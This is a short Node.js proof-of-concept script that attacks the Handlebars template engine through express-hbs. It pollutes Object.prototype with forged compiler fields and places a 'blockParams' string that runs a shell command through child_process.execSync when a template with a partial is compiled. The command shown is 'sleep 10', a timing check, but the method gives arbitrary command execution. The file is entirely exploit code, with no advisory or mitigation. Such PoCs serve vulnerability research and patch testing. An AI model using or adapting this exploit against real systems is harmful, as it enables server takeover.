const hbs = require('express-hbs');

Object.prototype.type="constructor",
Object.prototype.program={
    "opcodes": [],
    "children":[],
    "blockParams": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
}

// Register the 'emptyComment' partial
hbs.handlebars.registerPartial('emptyComment', '');

const source = `foo{{> emptyComment}}`
const template =  hbs.handlebars.compile(source);
template({msg:"World!"})

